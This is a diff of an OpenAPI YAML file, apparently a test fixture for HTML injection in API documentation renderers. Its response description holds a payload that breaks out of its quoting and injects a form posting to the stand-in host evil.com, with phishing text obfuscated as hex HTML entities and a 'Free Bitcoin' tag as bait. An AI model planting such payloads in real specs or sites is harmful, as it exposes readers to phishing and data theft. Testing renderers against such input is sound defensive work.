@@ -9,7 +9,7 @@ paths:
     get:
       responses:
         '200':
-          description: No response was specified'"><p><form action='https://evil.com'><input type='text'><input type='submit' value='Send'><!--
+          description: No response was specified'"><p>&#x45;&#x6e;&#x74;&#x65;&#x72;&#x20;&#x77;&#x69;&#x74;&#x68;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x70;&#x65;&#x72;&#x73;&#x6f;&#x6e;&#x61;&#x6c;&#x20;&#x64;&#x61;&#x74;&#x61;&#x3a;<form action='https://evil.com'><input type='text'><input type='submit' value='Send'><!--
       tags:
         - Free Bitcoin
       operationId: findAccounts
